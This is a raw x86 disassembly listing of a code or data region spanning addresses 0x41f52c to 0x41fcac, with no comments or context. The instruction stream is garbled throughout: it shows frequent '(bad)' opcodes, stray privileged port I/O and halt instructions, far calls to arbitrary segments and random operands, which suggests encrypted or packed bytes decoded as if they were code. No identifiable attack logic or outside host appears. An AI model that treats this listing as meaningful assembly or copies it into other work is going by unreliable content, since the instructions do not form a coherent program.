  41f52c:	or     BYTE PTR [ebx+0x4aa1ee8],0xf9
  41f533:	xchg   edx,eax
  41f534:	sti    
  41f535:	push   ebx
  41f536:	pop    esp
  41f537:	int    0xaf
  41f539:	or     BYTE PTR [edx-0x13b58ccd],dh
  41f53f:	dec    edi
  41f540:	or     esi,esp
  41f542:	jg     0x41f55b
  41f544:	sbb    bh,BYTE PTR [eax+0x6d]
  41f547:	(bad)  
  41f548:	xor    BYTE PTR [eax-0x70],dh
  41f54b:	or     cl,bh
  41f54d:	adc    DWORD PTR [ebx],esp
  41f54f:	jbe    0x41f50b
  41f551:	imul   edx,DWORD PTR [edi+0x62],0xfffffffb
  41f555:	call   0xe7b3:0x721713ee
  41f55c:	aam    0x95
  41f55e:	das    
  41f55f:	or     al,ch
  41f561:	and    al,BYTE PTR [edx]
  41f563:	mov    edx,0x482f8971
  41f568:	or     al,0x48
  41f56a:	push   eax
  41f56b:	adc    edx,DWORD PTR [esi]
  41f56d:	and    DWORD PTR [esi-0x68],0x25d523a1
  41f574:	ds inc esi
  41f576:	mov    edx,0x44e68338
  41f57b:	in     al,dx
  41f57c:	mov    al,ds:0xb3cbbb1d
  41f581:	pushf  
  41f582:	sub    dl,ch
  41f584:	inc    edx
  41f585:	stc    
  41f586:	add    al,0x1d
  41f588:	out    dx,al
  41f589:	push   0x510f6b47
  41f58e:	dec    edi
  41f58f:	push   eax
  41f590:	(bad)  
  41f591:	cmp    eax,DWORD PTR [edx]
  41f593:	es mov dl,0x39
  41f596:	test   eax,0xa7ee0afa
  41f59b:	inc    ecx
  41f59c:	sub    bh,al
  41f59e:	fst    DWORD PTR [edi]
  41f5a0:	mov    ebx,0x4d65b38a
  41f5a5:	jne    0x41f531
  41f5a7:	(bad)  
  41f5a8:	stos   BYTE PTR es:[edi],al
  41f5a9:	push   0xffffffb4
  41f5ab:	js     0x41f592
  41f5ad:	outs   dx,BYTE PTR ds:[esi]
  41f5ae:	lea    ecx,[eax-0x6f]
  41f5b1:	inc    ebp
  41f5b2:	pop    es
  41f5b3:	push   es
  41f5b4:	ins    BYTE PTR es:[edi],dx
  41f5b5:	push   ebx
  41f5b6:	pop    ecx
  41f5b7:	add    bl,BYTE PTR [ebx+0x3da6c370]
  41f5bd:	jecxz  0x41f5ae
  41f5bf:	shr    BYTE PTR [edx+0x1545340c],1
  41f5c5:	and    ah,ch
  41f5c7:	xchg   esi,eax
  41f5c8:	jo     0x41f61f
  41f5ca:	mov    edx,0x5e1db13b
  41f5cf:	outs   dx,BYTE PTR ds:[esi]
  41f5d0:	xor    cl,BYTE PTR [ecx-0x4ba93de5]
  41f5d6:	dec    ch
  41f5d8:	and    dh,bh
  41f5da:	jecxz  0x41f636
  41f5dc:	adc    eax,0x7a6ba1c9
  41f5e1:	mov    al,0xef
  41f5e3:	fwait
  41f5e4:	mov    eax,ds:0xf9879052
  41f5e9:	xlat   BYTE PTR ds:[ebx]
  41f5ea:	rcl    DWORD PTR [edi],cl
  41f5ec:	test   al,0x7c
  41f5ee:	loope  0x41f5b8
  41f5f0:	cmp    esi,esi
  41f5f2:	dec    ebx
  41f5f3:	and    al,0xe3
  41f5f5:	into   
  41f5f6:	retf   0xecdf
  41f5f9:	mov    ebp,0x5642fb84
  41f5fe:	and    dl,dh
  41f600:	xor    ah,BYTE PTR [edi-0x47f1f955]
  41f606:	pop    esp
  41f607:	icebp  
  41f608:	and    eax,0xb82f6d4a
  41f60d:	mov    ah,0x9d
  41f60f:	jg     0x41f663
  41f611:	inc    ecx
  41f612:	mov    edi,ecx
  41f614:	pusha  
  41f615:	dec    ebp
  41f616:	dec    esi
  41f617:	ror    esp,cl
  41f619:	push   eax
  41f61a:	or     eax,0x2f310f07
  41f61f:	imul   edx,esi,0x41e68881
  41f625:	pop    ecx
  41f626:	mul    BYTE PTR [ebx+0x76209398]
  41f62c:	sbb    eax,0x8d50e218
  41f631:	(bad)  [edx+0x498be333]
  41f637:	retf   
  41f638:	cmp    BYTE PTR ss:[ecx-0x6],ah
  41f63c:	mov    eax,0x4a486fa1
  41f641:	add    bh,cl
  41f643:	test   al,0x61
  41f645:	mov    eax,ds:0xd138049f
  41f64a:	pop    ecx
  41f64b:	ja     0x41f629
  41f64d:	or     eax,0x61fa20e8
  41f652:	call   0x27f4eed9
  41f657:	xchg   edx,eax
  41f658:	cmp    dl,0x7c
  41f65b:	or     al,0x7
  41f65d:	fwait
  41f65e:	push   es
  41f65f:	fcom   DWORD PTR [edi+0x7ac2aaa0]
  41f665:	push   esp
  41f666:	int    0x77
  41f668:	mov    dh,BYTE PTR [ecx+0x74]
  41f66b:	js     0x41f601
  41f66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f66e:	cmc    
  41f66f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f670:	int    0x71
  41f672:	pop    ebp
  41f673:	and    eax,0x78fb1027
  41f678:	xor    bh,BYTE PTR [esi]
  41f67a:	jp     0x41f65d
  41f67c:	sbb    al,0x66
  41f67e:	xchg   ebx,eax
  41f67f:	mov    cl,0x67
  41f681:	mov    al,0xff
  41f683:	push   edx
  41f684:	sub    al,BYTE PTR [edx-0x15a585a1]
  41f68a:	not    BYTE PTR [ecx]
  41f68c:	call   0x420c:0x77fe78f9
  41f693:	into   
  41f694:	(bad)  
  41f695:	adc    eax,0x8bdf96dc
  41f69a:	push   cs
  41f69b:	test   al,0xd
  41f69d:	dec    ebp
  41f69e:	test   al,0x6
  41f6a0:	out    dx,eax
  41f6a1:	mov    bl,0xc0
  41f6a3:	adc    ch,0x4b
  41f6a6:	mov    edi,0xdc26689d
  41f6ab:	repz mov edi,0xd93d4701
  41f6b1:	jl     0x41f70e
  41f6b3:	not    BYTE PTR [edi+0x1a]
  41f6b6:	fisub  WORD PTR [esi-0x226d4a35]
  41f6bc:	and    BYTE PTR [esi-0x5b],ch
  41f6bf:	jae    0x41f726
  41f6c1:	sar    BYTE PTR [ebp-0x75ee27e8],0x41
  41f6c8:	lea    esp,ds:0x95023512
  41f6ce:	scas   eax,DWORD PTR es:[edi]
  41f6cf:	push   ds
  41f6d0:	add    al,0x1d
  41f6d2:	imul   edx,DWORD PTR [esi+0x7],0xab7602c4
  41f6d9:	out    dx,al
  41f6da:	call   DWORD PTR [edi]
  41f6dc:	sub    al,0x48
  41f6de:	mov    ah,0xa5
  41f6e0:	sar    DWORD PTR [ebx],0xb1
  41f6e3:	pop    eax
  41f6e4:	cmp    bl,BYTE PTR [edx-0x8a43055]
  41f6ea:	add    ebp,DWORD PTR [ebx]
  41f6ec:	pusha  
  41f6ed:	inc    edx
  41f6ee:	jmp    0x41f671
  41f6f0:	push   esi
  41f6f1:	pop    esp
  41f6f2:	xor    eax,0xd01386b4
  41f6f7:	scas   al,BYTE PTR es:[edi]
  41f6f8:	cli    
  41f6f9:	inc    esi
  41f6fa:	(bad)
  41f6fe:	stc    
  41f6ff:	xor    BYTE PTR [eax+esi*2+0x70],0xea
  41f704:	cmp    esi,DWORD PTR [edx]
  41f706:	scas   eax,DWORD PTR es:[edi]
  41f707:	inc    ecx
  41f708:	repz in al,0xcc
  41f70b:	dec    ebx
  41f70c:	cmp    eax,0xf52d1e1f
  41f711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f712:	xchg   ebp,esi
  41f714:	mov    eax,ds:0xb30c3c69
  41f719:	add    ebx,esp
  41f71b:	out    dx,eax
  41f71c:	pop    es
  41f71d:	sar    BYTE PTR [esi],1
  41f71f:	xchg   ebp,eax
  41f720:	mov    DWORD PTR [eax+ecx*8-0x42],eax
  41f724:	dec    ecx
  41f725:	pushf  
  41f726:	mov    cl,0x94
  41f728:	jnp    0x41f74d
  41f72a:	inc    edi
  41f72b:	inc    esi
  41f72c:	lahf   
  41f72d:	(bad)  
  41f72e:	pop    edi
  41f72f:	xchg   edx,eax
  41f730:	in     al,dx
  41f731:	pop    ss
  41f732:	fidiv  DWORD PTR [esi]
  41f734:	dec    ecx
  41f735:	and    ebx,DWORD PTR [edi+0x6e]
  41f738:	sti    
  41f739:	push   ds
  41f73a:	jnp    0x41f738
  41f73c:	outs   dx,DWORD PTR ds:[esi]
  41f73d:	push   ss
  41f73e:	imul   eax,DWORD PTR [ecx-0x10594ead],0xaf940f59
  41f748:	sbb    eax,0x11e788a8
  41f74d:	mov    esi,0x368af1c9
  41f752:	mov    ah,0x2b
  41f754:	push   edi
  41f755:	out    0x71,eax
  41f757:	push   0x24
  41f759:	xchg   dl,cl
  41f75b:	ror    DWORD PTR [eax-0x4e],cl
  41f75e:	lods   al,BYTE PTR ds:[esi]
  41f75f:	add    DWORD PTR [ebx-0x7711d8b1],ebx
  41f765:	cmp    BYTE PTR [esi],dl
  41f767:	push   edx
  41f768:	sub    cl,BYTE PTR [eax+0x34fedcf9]
  41f76e:	nop
  41f76f:	and    al,0x22
  41f771:	sbb    ah,bl
  41f773:	pop    edx
  41f774:	sahf   
  41f775:	jge    0x41f7ea
  41f777:	inc    ecx
  41f778:	sbb    edx,DWORD PTR [edx]
  41f77a:	mov    al,BYTE PTR [ebp+0x1d2b4443]
  41f780:	fwait
  41f781:	iret   
  41f782:	aam    0x36
  41f784:	sub    eax,0x42862591
  41f789:	test   DWORD PTR [eax],ebp
  41f78b:	jmp    0xfa2c:0x72ff7c57
  41f792:	mov    WORD PTR [ebx+edi*2+0x6f],fs
  41f796:	out    0xf6,al
  41f798:	mov    DWORD PTR [edx-0x3c366d30],0xf1742966
  41f7a2:	loopne 0x41f7df
  41f7a4:	call   0xd61c:0x2f54c4b1
  41f7ab:	in     eax,0x8d
  41f7ad:	add    al,0xf
  41f7af:	jb     0x41f76d
  41f7b1:	sub    eax,0xbf5da2b
  41f7b6:	lahf   
  41f7b7:	lfs    esp,FWORD PTR [ecx-0x7147dcbc]
  41f7be:	add    bl,ch
  41f7c0:	pop    ecx
  41f7c1:	into   
  41f7c2:	push   esi
  41f7c3:	jbe    0x41f781
  41f7c5:	push   eax
  41f7c6:	out    0xd5,al
  41f7c8:	sahf   
  41f7c9:	mov    ebp,0xfa83bea9
  41f7ce:	pop    edx
  41f7cf:	bound  esp,QWORD PTR [esi]
  41f7d1:	adc    DWORD PTR [eax+0x117d42e0],edi
  41f7d7:	cmp    al,0xef
  41f7d9:	in     al,0x50
  41f7db:	gs std 
  41f7dd:	aam    0x69
  41f7df:	mov    esi,0xeb3bd85b
  41f7e4:	pop    esi
  41f7e5:	or     eax,0x1e2b76d4
  41f7ea:	pop    ebx
  41f7eb:	push   edi
  41f7ec:	icebp  
  41f7ed:	pop    ds
  41f7ee:	ret    
  41f7ef:	mov    al,0xf5
  41f7f1:	inc    eax
  41f7f2:	adc    eax,0xeb8853c4
  41f7f7:	pop    esp
  41f7f8:	lahf   
  41f7f9:	enter  0xda92,0xeb
  41f7fd:	je     0x41f828
  41f7ff:	jo     0x41f7e8
  41f801:	hlt    
  41f802:	ja     0x41f7e0
  41f804:	mov    dh,0x37
  41f806:	mov    ds:0xac14a758,eax
  41f80b:	pusha  
  41f80c:	je     0x41f7c1
  41f80e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f80f:	bound  esp,QWORD PTR [edx]
  41f811:	test   eax,0x9f47a22b
  41f816:	test   DWORD PTR [eax+0x54],ebx
  41f819:	cmp    al,0xd1
  41f81b:	dec    ebx
  41f81c:	fcomp  DWORD PTR [edx+ebx*1-0x2b]
  41f820:	sbb    DWORD PTR [edi-0x7a1f92b3],edi
  41f826:	(bad)  
  41f829:	xchg   edx,eax
  41f82a:	call   0x791370e
  41f82f:	pop    edx
  41f830:	popf   
  41f831:	cld    
  41f832:	mov    ?,WORD PTR [edx]
  41f834:	out    0x4a,eax
  41f836:	jae    0x41f890
  41f838:	pop    edi
  41f839:	jecxz  0x41f890
  41f83b:	and    eax,0xfebe4b61
  41f840:	xchg   edx,eax
  41f841:	das    
  41f842:	arpl   WORD PTR [edi-0x1f6f9852],bx
  41f848:	pop    edx
  41f849:	dec    BYTE PTR [esi+0x577d462e]
  41f84f:	push   0x4c
  41f851:	sub    eax,0x5f664c55
  41f856:	and    dl,BYTE PTR [ebx-0x499781f1]
  41f85c:	add    edi,ecx
  41f85e:	cmp    dl,BYTE PTR [eax+0x11c0a99]
  41f864:	sub    BYTE PTR [edx-0x36],0x8a
  41f868:	mov    esp,0xab27a6ad
  41f86d:	pushf  
  41f86e:	int3   
  41f86f:	(bad)  [esi]
  41f871:	jle    0x41f7f6
  41f873:	mov    ch,0xef
  41f875:	xchg   ecx,eax
  41f876:	nop
  41f877:	test   al,0xbf
  41f879:	adc    al,0x4d
  41f87b:	mov    cl,0x35
  41f87d:	mov    esp,ss
  41f87f:	dec    esp
  41f880:	sar    BYTE PTR [edi+0x5ed10b5c],cl
  41f886:	mov    bl,0x25
  41f888:	push   esp
  41f889:	mov    fs,WORD PTR [eax-0x43306c05]
  41f88f:	and    esi,DWORD PTR [ecx+esi*4-0x37fe7493]
  41f896:	es stos DWORD PTR es:[edi],eax
  41f898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f899:	and    ebx,esp
  41f89b:	pop    ebp
  41f89c:	mov    bl,0x1a
  41f89e:	or     eax,0x69baa419
  41f8a3:	mov    cs,WORD PTR [ebx-0x6]
  41f8a6:	xor    eax,0xf8b3c21b
  41f8ab:	loopne 0x41f880
  41f8ad:	or     al,0x52
  41f8af:	mov    eax,0x38e39366
  41f8b4:	imul   edx,ebp,0x27
  41f8b7:	iret   
  41f8b8:	or     BYTE PTR [eax+0x3008ee44],0x59
  41f8bf:	push   ds
  41f8c0:	lock mov dh,0x55
  41f8c3:	mov    ebp,0x5d99da59
  41f8c8:	inc    esp
  41f8c9:	jnp    0x41f8b6
  41f8cb:	fldcw  WORD PTR [eax+edi*1]
  41f8ce:	cmp    esp,edi
  41f8d0:	aad    0xe7
  41f8d2:	dec    edx
  41f8d3:	push   ds
  41f8d4:	jmp    0xb0f3ba6c
  41f8d9:	push   edx
  41f8da:	aaa    
  41f8db:	or     dh,BYTE PTR [edx-0x2d]
  41f8de:	std    
  41f8df:	aad    0x13
  41f8e1:	or     BYTE PTR [eax],cl
  41f8e3:	add    BYTE PTR [esi+0x28],dh
  41f8e6:	mov    ss,WORD PTR [ecx]
  41f8e8:	gs sahf 
  41f8ea:	push   esp
  41f8eb:	stos   BYTE PTR es:[edi],al
  41f8ec:	push   esp
  41f8ed:	inc    ecx
  41f8ee:	jle    0x41f915
  41f8f0:	mov    bh,0xa0
  41f8f2:	daa    
  41f8f3:	cmp    BYTE PTR [ecx+0x2464e8b1],al
  41f8f9:	pop    es
  41f8fa:	rcr    DWORD PTR ss:[ebx],cl
  41f8fd:	rcl    BYTE PTR [edx-0x2f],0xab
  41f901:	cld    
  41f902:	cmp    al,0xc
  41f904:	push   ecx
  41f905:	mov    eax,0x116b2ada
  41f90a:	dec    edi
  41f90b:	mov    al,ds:0xf5831762
  41f910:	mov    edx,0x953a8aa5
  41f915:	idiv   eax
  41f917:	addr16 dec edi
  41f919:	xchg   BYTE PTR [edi+0x76],dh
  41f91c:	mov    BYTE PTR ds:0xf6aac7a3,bl
  41f922:	(bad)  
  41f923:	push   esp
  41f924:	dec    edx
  41f925:	out    dx,al
  41f926:	and    dh,ah
  41f928:	int3   
  41f929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f92a:	rol    DWORD PTR [eax-0x36],1
  41f92d:	pop    esi
  41f92e:	mov    ebx,DWORD PTR [edx+0xb]
  41f931:	retf   0x56a4
  41f934:	jecxz  0x41f94e
  41f936:	xor    eax,DWORD PTR ds:0x8bc40d69
  41f93c:	cli    
  41f93d:	or     DWORD PTR [ecx],0x49
  41f940:	call   0x1ef7:0x376dc705
  41f947:	mov    ds:0x50be00a,eax
  41f94c:	mov    WORD PTR [edi],?
  41f94e:	xor    edx,DWORD PTR [eax+eiz*4]
  41f951:	leave  
  41f952:	xchg   DWORD PTR [edx+0x2526440c],edi
  41f958:	push   0xf540b41d
  41f95d:	pop    ebx
  41f95e:	or     DWORD PTR [eax+0x38],0xa0107400
  41f965:	dec    edx
  41f966:	loop   0x41f97c
  41f968:	cwde   
  41f969:	fmul   QWORD PTR [eax-0x16]
  41f96c:	xchg   ecx,eax
  41f96d:	lods   al,BYTE PTR ds:[esi]
  41f96e:	hlt    
  41f96f:	jae    0x41f9ea
  41f971:	push   ds
  41f972:	sar    BYTE PTR [edi],cl
  41f974:	test   BYTE PTR [ebx-0x2edd472a],0x79
  41f97b:	dec    esi
  41f97c:	and    edx,DWORD PTR [ebx+0x12193c62]
  41f982:	call   0xbf306dc8
  41f987:	and    bh,BYTE PTR [edi]
  41f989:	inc    edx
  41f98a:	pushfw 
  41f98c:	pop    ss
  41f98d:	aad    0xca
  41f98f:	retf   0xae6f
  41f992:	mov    ecx,0x4636941c
  41f997:	es loop 0x41f9b5
  41f99a:	xchg   ebx,eax
  41f99b:	inc    ecx
  41f99c:	jnp    0x41f9ca
  41f99e:	dec    edi
  41f99f:	test   DWORD PTR [esi+0xa],ebx
  41f9a2:	dec    ecx
  41f9a3:	popa   
  41f9a4:	push   esi
  41f9a5:	cld    
  41f9a6:	inc    eax
  41f9a7:	inc    ebp
  41f9a8:	aam    0xf4
  41f9aa:	sub    DWORD PTR [eax],0xffffffa6
  41f9ad:	inc    ebp
  41f9ae:	ss push ebx
  41f9b0:	and    al,0x74
  41f9b2:	jae    0x41f9ba
  41f9b4:	xor    al,0xba
  41f9b6:	xor    DWORD PTR [ebp+0x5aa3749f],ebx
  41f9bc:	inc    ecx
  41f9bd:	mov    edi,0x4fb75078
  41f9c2:	in     eax,0x9d
  41f9c4:	aaa    
  41f9c5:	mov    dh,0xa5
  41f9c7:	or     cl,al
  41f9c9:	jnp    0x41fa0b
  41f9cb:	dec    ebx
  41f9cc:	mov    al,ds:0x8fff39ab
  41f9d1:	mov    edi,0x5ac5138b
  41f9d6:	xor    ebx,edi
  41f9d8:	(bad)  
  41f9d9:	in     eax,0x18
  41f9db:	int    0x26
  41f9dd:	and    BYTE PTR [eax-0x74c556f0],bl
  41f9e3:	inc    esi
  41f9e4:	mov    bl,0xc2
  41f9e6:	das    
  41f9e7:	ins    DWORD PTR es:[edi],dx
  41f9e8:	lods   al,BYTE PTR ds:[esi]
  41f9e9:	rcr    dh,1
  41f9eb:	repz retf 0x8d81
  41f9ef:	and    al,0x7f
  41f9f1:	jl     0x41fa20
  41f9f3:	pop    DWORD PTR [ebp+0x6f206573]
  41f9f9:	scas   al,BYTE PTR es:[edi]
  41f9fa:	dec    edx
  41f9fb:	pop    edi
  41f9fc:	jmp    0x41f9d4
  41f9fe:	mov    ch,0x74
  41fa00:	stos   BYTE PTR es:[edi],al
  41fa01:	push   0x6f
  41fa03:	mov    BYTE PTR [ebx+0x62],al
  41fa06:	or     BYTE PTR ds:0xeb7710a9,0xb5
  41fa0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa0e:	pop    esi
  41fa0f:	inc    edi
  41fa10:	push   ds
  41fa11:	(bad)  
  41fa12:	imul   ecx,DWORD PTR [eax-0x7231aa64],0xffffff94
  41fa19:	jle    0x41fa17
  41fa1b:	inc    ebx
  41fa1c:	int3   
  41fa1d:	pop    ss
  41fa1e:	leave  
  41fa1f:	in     eax,dx
  41fa20:	sbb    eax,0x1331c3f7
  41fa25:	arpl   WORD PTR [edx+0x58199d73],bp
  41fa2b:	in     eax,0xd2
  41fa2d:	jae    0x41fa87
  41fa2f:	mov    dl,0x30
  41fa31:	push   ds
  41fa32:	jmp    0x41fa73
  41fa34:	and    dh,cl
  41fa36:	push   esp
  41fa37:	xchg   BYTE PTR [ebx-0x4f],cl
  41fa3a:	call   0x743e819c
  41fa3f:	jne    0x41fa39
  41fa41:	inc    ebp
  41fa42:	dec    ebx
  41fa43:	pop    ss
  41fa44:	fst    QWORD PTR [eax]
  41fa46:	xchg   dl,dh
  41fa48:	cli    
  41fa49:	test   al,0x48
  41fa4b:	push   esp
  41fa4c:	pop    ss
  41fa4d:	jno    0x41f9dc
  41fa4f:	test   eax,esi
  41fa51:	jo     0x41fa65
  41fa53:	lods   eax,DWORD PTR ds:[esi]
  41fa54:	pop    es
  41fa55:	fild   DWORD PTR [edi]
  41fa57:	xor    al,0x82
  41fa59:	pop    ebp
  41fa5a:	pop    esi
  41fa5b:	cmp    al,0x72
  41fa5d:	loopne 0x41faa4
  41fa5f:	inc    ecx
  41fa60:	(bad)  
  41fa61:	addr16 iretw 
  41fa64:	xchg   ebx,eax
  41fa65:	inc    esp
  41fa66:	(bad)  [esi]
  41fa68:	push   esp
  41fa69:	imul   edi,DWORD PTR [eax+eax*2+0x73ca92ad],0x3
  41fa71:	shr    BYTE PTR [ebx-0x3b4c84de],0x1e
  41fa78:	jb     0x41fa73
  41fa7a:	pop    es
  41fa7b:	fstp   DWORD PTR [eax]
  41fa7d:	(bad)  
  41fa7e:	fisub  DWORD PTR [esi+edx*8]
  41fa81:	ror    BYTE PTR [esi],0xde
  41fa84:	xchg   ebp,eax
  41fa85:	xor    BYTE PTR [ecx-0x43ab28fe],bh
  41fa8b:	push   ecx
  41fa8c:	inc    eax
  41fa8d:	pop    ds
  41fa8e:	xchg   esp,eax
  41fa8f:	pop    esi
  41fa90:	jmp    0xe82ad254
  41fa95:	pop    edx
  41fa96:	jle    0x41fa98
  41fa98:	hlt    
  41fa99:	xchg   edi,eax
  41fa9a:	push   eax
  41fa9b:	jnp    0x41fab8
  41fa9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa9e:	adc    eax,esi
  41faa0:	adc    al,BYTE PTR [ecx-0x7339affd]
  41faa6:	xchg   esi,eax
  41faa7:	dec    edi
  41faa8:	fimul  DWORD PTR [esp+edi*1+0x7d43896e]
  41faaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab0:	hlt    
  41fab1:	std    
  41fab2:	xchg   ebx,eax
  41fab3:	stc    
  41fab4:	or     eax,0x5bdb1143
  41fab9:	cmp    BYTE PTR [edi],dl
  41fabb:	sub    DWORD PTR [esi],0x90466014
  41fac1:	push   ecx
  41fac2:	xchg   esi,eax
  41fac3:	mov    dh,0x85
  41fac5:	xchg   ebp,eax
  41fac6:	fbstp  TBYTE PTR [eax+0x74]
  41fac9:	or     eax,0x73969ea2
  41face:	rcr    DWORD PTR [ebx+0x40],cl
  41fad1:	and    eax,0x8eb315d4
  41fad6:	and    DWORD PTR [edx-0x7c],esi
  41fad9:	imul   ecx,DWORD PTR [ebx],0x3046e271
  41fadf:	dec    edi
  41fae0:	nop
  41fae1:	(bad)  
  41fae2:	fidiv  DWORD PTR [ecx]
  41fae4:	aas    
  41fae5:	lea    edx,[esp+ebx*1+0x3f]
  41fae9:	add    al,0xe3
  41faeb:	push   edi
  41faec:	(bad)  
  41faed:	jg     0x41fb06
  41faef:	add    DWORD PTR [edi-0x32],ebx
  41faf2:	outs   dx,BYTE PTR ds:[esi]
  41faf3:	out    0x73,eax
  41faf5:	and    BYTE PTR [ebx],dl
  41faf7:	les    ecx,FWORD PTR [ebx]
  41faf9:	and    bh,BYTE PTR [edi+0x77e55154]
  41faff:	sbb    ebp,DWORD PTR [ecx]
  41fb01:	aaa    
  41fb02:	(bad)  ds:0xe00613dd
  41fb08:	sub    eax,0xb35a8da4
  41fb0d:	test   eax,0x12411201
  41fb12:	hlt    
  41fb13:	shr    BYTE PTR [edi+0x229bb6c1],1
  41fb19:	adc    dh,BYTE PTR [ebx-0x3f0cf074]
  41fb1f:	jge    0x41fb1a
  41fb21:	xor    DWORD PTR [eax],ebp
  41fb23:	in     eax,0xc3
  41fb25:	mov    ds:0x80f26274,al
  41fb2a:	inc    eax
  41fb2b:	loopne 0x41fba9
  41fb2d:	cmp    BYTE PTR [esi],bh
  41fb2f:	pop    es
  41fb30:	loop   0x41fb42
  41fb32:	call   0xbe25:0xc4d5b4c0
  41fb39:	pop    es
  41fb3a:	sub    edi,DWORD PTR [ecx]
  41fb3c:	mov    esp,0x5fb222e5
  41fb41:	std    
  41fb42:	push   esp
  41fb43:	push   ebp
  41fb44:	sbb    ah,BYTE PTR [esi-0x233bc1ef]
  41fb4a:	fsubp  st(2),st
  41fb4c:	mov    cs,WORD PTR [edx+0x3ef808ce]
  41fb52:	js     0x41fb9f
  41fb54:	mov    eax,0x29c1786f
  41fb59:	(bad)  
  41fb5a:	mov    ecx,0x18392996
  41fb5f:	cmp    eax,0xeb3030f3
  41fb64:	ficom  DWORD PTR [esi-0x6f]
  41fb67:	je     0x41faf3
  41fb69:	mov    ?,esi
  41fb6b:	inc    ebp
  41fb6c:	out    0x30,al
  41fb6e:	test   al,0xf0
  41fb70:	push   cs
  41fb71:	mov    ds:0x31f2b64,al
  41fb76:	sbb    bl,BYTE PTR [edi+0x302cba0c]
  41fb7c:	repz daa 
  41fb7e:	and    cl,BYTE PTR [ebp-0x49]
  41fb81:	test   eax,0xeac73e6b
  41fb86:	and    al,0x6b
  41fb88:	test   esp,edx
  41fb8a:	lahf   
  41fb8b:	mov    eax,ds:0x12490aa2
  41fb90:	outs   dx,BYTE PTR ds:[esi]
  41fb91:	jmp    0x893c:0xec046cd1
  41fb98:	ss rcr esp,cl
  41fb9b:	vaddsubpd xmm0,xmm4,XMMWORD PTR [ecx]
  41fb9f:	xor    al,0xe0
  41fba1:	ja     0x41fbcc
  41fba3:	or     esp,ebx
  41fba5:	jbe    0x41fb44
  41fba7:	push   eax
  41fba8:	in     eax,0x77
  41fbaa:	mov    edx,0xb956f45
  41fbaf:	push   edi
  41fbb0:	jns    0x41fb3b
  41fbb2:	cmp    ecx,DWORD PTR ds:0xe2743af4
  41fbb8:	jge    0x41fb4c
  41fbba:	rcr    al,0xf8
  41fbbd:	sub    DWORD PTR [ecx],esp
  41fbbf:	xor    dh,dl
  41fbc1:	cmp    ch,BYTE PTR [edi+0x6f2483d7]
  41fbc7:	sahf   
  41fbc8:	ss pusha 
  41fbca:	mov    bl,0x9b
  41fbcc:	mov    ecx,ebx
  41fbce:	dec    eax
  41fbcf:	ffree  st(1)
  41fbd1:	and    al,BYTE PTR [edi]
  41fbd3:	fld    DWORD PTR [edi+0x415c70df]
  41fbd9:	loop   0x41fbc8
  41fbdb:	je     0x41fba6
  41fbdd:	or     al,0x11
  41fbdf:	pop    ebp
  41fbe0:	mov    cl,0x99
  41fbe2:	stc    
  41fbe3:	outs   dx,BYTE PTR ds:[esi]
  41fbe4:	cmp    eax,0xb6b86a8b
  41fbe9:	mov    esp,0x1815d5e8
  41fbee:	hlt    
  41fbef:	fld    DWORD PTR [ebp-0x79]
  41fbf2:	sub    DWORD PTR [eax],ecx
  41fbf4:	add    al,0xb0
  41fbf6:	int3   
  41fbf7:	add    DWORD PTR [edx+0x4749dbb8],eax
  41fbfd:	in     al,dx
  41fbfe:	or     eax,0xafb82c3a
  41fc03:	ja     0x41fc41
  41fc05:	xchg   esp,eax
  41fc06:	(bad)  
  41fc07:	aad    0x7a
  41fc09:	jle    0x41fc16
  41fc0b:	test   al,0x9
  41fc0d:	shl    BYTE PTR [edi+ecx*4+0x28],1
  41fc11:	out    0xaf,eax
  41fc13:	(bad)  
  41fc14:	mov    dh,0x62
  41fc16:	sahf   
  41fc17:	jae    0x41fc02
  41fc19:	add    al,BYTE PTR [ecx-0x231798e]
  41fc1f:	bndldx (bad),[ecx-0x5f]
  41fc23:	in     al,dx
  41fc24:	xchg   edx,ebx
  41fc26:	loope  0x41fc61
  41fc28:	cdq    
  41fc29:	cmc    
  41fc2a:	xchg   edx,eax
  41fc2b:	in     al,0xc0
  41fc2d:	push   ecx
  41fc2e:	mov    al,0x3c
  41fc30:	rcl    DWORD PTR [edi],0xbf
  41fc33:	xor    bl,dl
  41fc35:	fsincos 
  41fc37:	mov    eax,ds:0xadbbcb2b
  41fc3c:	loope  0x41fc2d
  41fc3e:	ins    BYTE PTR es:[edi],dx
  41fc3f:	mov    DWORD PTR [eax-0x39],edx
  41fc42:	aaa    
  41fc43:	leave  
  41fc44:	cwde   
  41fc45:	int    0xb9
  41fc47:	ret    0xf6c2
  41fc4a:	leave  
  41fc4b:	aam    0x9d
  41fc4d:	inc    esp
  41fc4e:	jmp    0xc6b0fd36
  41fc53:	lods   eax,DWORD PTR ds:[esi]
  41fc54:	pop    ecx
  41fc55:	mov    al,bh
  41fc57:	push   esi
  41fc58:	jg     0x41fbf7
  41fc5a:	adc    BYTE PTR [ebx],dh
  41fc5c:	jecxz  0x41fc66
  41fc5e:	xor    ah,dh
  41fc60:	xchg   ebp,eax
  41fc61:	pop    edi
  41fc62:	xchg   dh,bl
  41fc64:	push   0x33
  41fc66:	add    eax,0x6bb980ac
  41fc6b:	sub    eax,0xa214e0fb
  41fc70:	test   al,0x43
  41fc72:	adc    bl,bh
  41fc74:	xchg   esp,eax
  41fc75:	push   esp
  41fc76:	add    ebx,DWORD PTR [eax+0x2dca12d3]
  41fc7c:	mov    ah,cl
  41fc7e:	sub    cl,BYTE PTR [ebp+0x3ebe6377]
  41fc84:	dec    ebx
  41fc85:	test   eax,0xffc4b675
  41fc8a:	cmp    dl,bl
  41fc8c:	add    BYTE PTR [edi+0x74],ah
  41fc8f:	cmp    ch,BYTE PTR [esi-0x64eb2843]
  41fc95:	ret    
  41fc96:	cmp    eax,DWORD PTR [ebx-0x17]
  41fc99:	dec    edi
  41fc9a:	or     ebx,esp
  41fc9c:	and    ch,ah
  41fc9e:	mov    eax,0x8c7b7c80
  41fca3:	(bad)  
  41fca4:	cld    
  41fca5:	scas   al,BYTE PTR es:[edi]
  41fca6:	adc    al,BYTE PTR [eax+0x54e0b27c]
  41fcac:	loopne 0x41fce1
